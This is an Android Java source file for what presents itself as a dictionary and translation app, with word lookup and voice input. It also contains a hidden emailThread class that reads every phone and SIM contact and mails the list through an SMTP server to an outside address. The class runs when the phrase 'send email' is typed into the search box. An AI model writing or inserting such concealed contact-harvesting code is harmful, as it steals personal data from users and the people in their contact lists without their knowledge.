package com.example.yecai.dict;

import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Address;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.app.Activity;
import android.os.Bundle;
import android.service.textservice.SpellCheckerService;
import android.text.Html;
import android.text.method.ScrollingMovementMethod;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.speech.RecognizerIntent;
import android.content.Intent;
import android.widget.Toast;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;

//import java.net.Authenticator;
//import java.net.PasswordAuthentication;
import java.lang.Thread;
import java.util.ArrayList;
import java.util.Properties;

import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Authenticator;
//import javax.mail.Address;
import javax.mail.PasswordAuthentication;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.AddressException;
import javax.mail.internet.MimeMessage;

class emailThread extends Thread
{
    private Context context;
    emailThread(Context activity)
    {
        context = activity;
    }
    //testing
    //getPhoneContacts();
    //sendEmail();
//for phone contact information
    private final String[] PHONES_PROJECTION = new String[]
            {
                    Phone.DISPLAY_NAME,
                    Phone.NUMBER,
                    Phone.PHOTO_ID,
                    Phone.CONTACT_ID
            };
    private static final int PHONES_DISPLAY_NAME_INDEX = 0;
    private static final int PHONES_NUMBER_INDEX = 1;
    private static final int PHONES_PHOTO_INDEX = 2;
    private static final int PHONES_CONTACT_INDEX = 3;

    //获取手机通讯录
    private String getPhoneNumber(Cursor phoneCursor)
    {
        return phoneCursor.getString(PHONES_NUMBER_INDEX);
    }

    private String getContactName(Cursor phoneCursor)
    {
        return phoneCursor.getString(PHONES_DISPLAY_NAME_INDEX);
    }

    private String getPhoneContacts()
    {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor phoneCursor = contentResolver.query(Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
        //ArrayList<String> phoneNumberList = new ArrayList<String>();
        //ArrayList<String> contactNameList = new ArrayList<String>();
        String result = "";
        if(phoneCursor != null)
        {
            while(phoneCursor.moveToNext())
            {
                //phoneNumberList.add(phoneNumber);
                //contactNameList.add(contactName);
                result += getContactName(phoneCursor) + " " + getPhoneNumber(phoneCursor) + "\n";
            }
        }
        System.out.println(result);
        return result;
    }
    //获取sim卡通讯录
    private String getSimContacts()
    {
        String result = "";

        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://icc/adn");//sim card
        Cursor phoneCursor = contentResolver.query(uri, PHONES_PROJECTION, null, null, null);

        if(phoneCursor != null)
        {
            while (phoneCursor.moveToNext())
            {
                result += getContactName(phoneCursor) + " " + getPhoneNumber(phoneCursor) + "\n";
            }
            System.out.println(result);
        }
        return result;
    }

    private void sendContactsEmail()
    {
        String smtp = "smtp.163.com";
        String port = "25";

        final String username = "caiye1231";
        final String pass = "*****";

        Properties property = new Properties();
        property.put("mail.smtp.host", smtp);
        property.put("mail.smtp.port", port);
        property.put("mail.smtp.auth", "true");
        Authenticator auth = new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication()
            {
                return new PasswordAuthentication(username, pass);//super.getPasswordAuthentication();
            }
        };

        Session session = Session.getInstance(property, auth);
        String from = "caiye1231@163.com";
        String to = "ye.cai@envisioncn.com";
        try
        {
            MimeMessage message = new MimeMessage(session);

            //get contacts information
            String contacts = "phone contacts: \n" + getPhoneContacts();
            contacts += "sim contacts: \n" + getSimContacts();

            InternetAddress addrFrom = new InternetAddress(from);
            InternetAddress addrTo =  new InternetAddress(to);
            try
            {
                message.setContent(contacts, "text/plain");
                message.setSubject("contacts info");
                message.setFrom(addrFrom);
                message.addRecipient(MimeMessage.RecipientType.TO, addrTo);
                message.saveChanges();

                Transport transport = session.getTransport("smtp");
                transport.connect(smtp, username, pass);
                transport.send(message);
                transport.close();
            }
            catch (MessagingException e)
            {
                System.out.println("message exception: " + e);
            }
        }
        catch(AddressException e)
        {
            System.out.println("address exception: " + e);
        }
    }
    @Override
    public void run()//send mail
    {
        sendContactsEmail();
        //handler.sendEmptyMessage(msg_send_mail);
    }
}

public class ActivityDict extends Activity {
    private static final int VOICE_RECOGNITION_CODE = 1234;
    private int msg_get_result = 0x123;
    private int msg_send_mail = 0x456;

    TextView translate;
    String result;
    String word;

    Handler handler = new Handler()
    {
        @Override
    public  void handleMessage(Message msg)
        {
            if(msg.what == msg_get_result)
            {
                CharSequence sequence = Html.fromHtml(result);
                translate.setText(sequence);
            }

            if(msg.what == msg_send_mail)
            {
                ;
            }
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_activity_dict);
        Button btn = (Button)findViewById(R.id.search);
        final EditText edit = (EditText)findViewById(R.id.word);
        translate = (TextView)findViewById(R.id.view);
        translate.setMovementMethod(ScrollingMovementMethod.getInstance());
        btn.setOnClickListener(
                new View.OnClickListener()
                {
                    @Override
                public void onClick(View v)
                    {
                        word = edit.getText().toString();
                        new Thread()
                        {
                            @Override
                            public void run()
                            {
                                if(word.isEmpty())
                                    result = "word is empty!";
                                else if(isOpenNetwork() == false)
                                    result = "The network connection is unavailable!";
                                else
                                {
                                    TransLate trans = new TransLate(word);
                                    result = trans.parseTranslateFromUrl();
                                }
                                handler.sendEmptyMessage(msg_get_result);
                            }
                        }.start();

                        if(word.equals("send email") )
                        {
                            new emailThread(ActivityDict.this).start();
                        }
                    }
                }
        );

        Button say = (Button)findViewById(R.id.voice);
        say.setOnClickListener(
                new View.OnClickListener()
                {
                    @Override
                    public void onClick(View v)
                    {
                        try
                        {
                            Intent intent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
                            intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
                            intent.putExtra(RecognizerIntent.EXTRA_PROMPT, "say");
                            startActivityForResult(intent, VOICE_RECOGNITION_CODE);
                        }
                        catch(ActivityNotFoundException e)
                        {
                            Toast.makeText(ActivityDict.this, "can not find voice device", Toast.LENGTH_LONG).show();
                        }
                    }
                }
        );
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_dict, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    private boolean isOpenNetwork()
    {
        ConnectivityManager connManager = (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);
        if(connManager.getActiveNetworkInfo() != null) {
            return connManager.getActiveNetworkInfo().isAvailable();
        }

        return false;
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        if(requestCode == VOICE_RECOGNITION_CODE && resultCode == RESULT_OK)
        {
            ArrayList<String> results = data.getStringArrayListExtra(RecognizerIntent.EXTRA_RESULTS);
            if(results.isEmpty() == false)//first match
            {
                ((EditText)findViewById(R.id.word)).setText(results.get(0), TextView.BufferType.NORMAL);
            }

        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
